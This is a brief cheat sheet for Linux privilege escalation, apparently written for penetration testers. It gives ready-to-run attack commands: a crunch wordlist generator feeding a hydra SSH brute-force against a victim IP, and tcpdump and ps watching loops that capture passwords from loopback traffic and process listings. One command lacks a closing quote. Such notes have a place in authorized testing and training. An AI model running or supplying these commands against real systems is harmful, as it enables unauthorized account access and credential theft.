# Linux Privilege Escalation

## Automated enumeration

```
/usr/bin/unix-privesc-check
```

## Brute force ssh

```
crunch 11 11 -t Password%%% > wordlist
hydra -l user -P wordlist $VictimIP -t 4 ssh -V
```

## Services

```
sudo tcpdump -i lo -A | grep "pass"
watch -n1 "ps auxww | grep pass | grep -v grep | fold -s
```
